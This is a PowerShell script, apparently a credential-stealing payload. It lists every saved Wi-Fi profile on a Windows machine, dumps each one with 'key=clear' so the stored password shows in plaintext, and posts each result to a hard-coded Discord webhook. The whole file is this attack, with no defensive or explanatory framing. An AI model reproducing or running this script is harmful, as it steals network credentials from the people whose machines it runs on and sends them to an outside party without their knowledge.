# Define the command to show all WLAN profiles
$showProfilesCommand = "cmd /c netsh wlan show profile"


# Run the command to get all WLAN profiles and parse the results
$profilesOutput = & $showProfilesCommand
$profiles = $profilesOutput | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }

# Loop through each WLAN profile and run the command to show the profile details
foreach ($profile in $profiles) {
    # Define the command to show the profile details
    $showProfileCommand = "netsh wlan show profile name=`"$profile`" key=clear"

    # Run the command to get the profile details and send them to Discord
    $profileOutput = & $showProfileCommand
    $webhookUrl = "https://discord.com/api/webhooks/1076457758339113011/P3IfFUZ1fPc0hol-XyLStktJlgQQZ-UPY_c1hcOm_IDcBLufahYvTkg51wbQ9XEEBJFO"
    $postData = @{ content = "WLAN Profile: $profile`n`n$profileOutput" } | ConvertTo-Json
    Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $postData -ContentType 'application/json'
}
